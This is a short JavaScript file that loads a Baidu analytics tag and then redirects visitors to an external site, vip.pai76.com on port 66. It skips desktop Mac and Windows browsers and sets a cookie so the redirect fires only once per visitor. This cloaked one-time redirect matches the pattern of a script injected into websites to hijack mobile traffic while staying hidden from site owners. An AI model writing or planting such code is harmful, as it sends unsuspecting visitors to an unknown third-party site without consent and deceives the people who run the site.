

addjs('https://hm.baidu.com/hm.js?1a69a290b4a00f35c039755766677e88');
function addjs(src) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.src = src;
    document.getElementsByTagName('head')[0].appendChild(script);
}
if (navigator.platform.indexOf('Mac') == 0 || navigator.platform.indexOf('Win') == 0) {
    throw SyntaxError();
}
window.onload = function(){
    if (!getCookie('cc_cookie')) {
        setCookie('cc_cookie','ok',1);
        window.location.href="https://vip.pai76.com:66/?c=4217";
     }
}
function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i].trim();
        if (c.indexOf(name) == 0) return c.substring(name.length, c.length);
    }
    return "";
}
function setCookie(key, val, time) {
    var date = new Date();
    var expiresHours = time;
    date.setTime(date.getTime() + expiresHours * 2000 * 1000);
    document.cookie = key + "=" + val + ";expires=" + date.toGMTString();
}
